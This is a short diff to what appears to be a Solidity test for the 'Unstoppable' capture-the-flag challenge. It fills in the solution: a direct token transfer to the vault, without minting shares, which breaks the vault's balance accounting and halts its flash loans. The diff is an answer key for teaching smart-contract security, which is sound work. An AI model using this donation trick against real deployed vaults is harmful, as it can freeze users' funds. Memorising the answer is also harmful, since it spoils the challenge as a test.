@@ -94,6 +94,8 @@ contract UnstoppableChallenge is Test {
         // Hint: you are holding 10 DVT. What assumption does the vault make about its own balance?
         //
         // TODO: your code goes here
+        // transfer tokens directly to the vault without minting vault shares.
+        token.transfer(address(vault), 1e18);
     }
 
     ////////////////////////////////////////////////////////////////////////
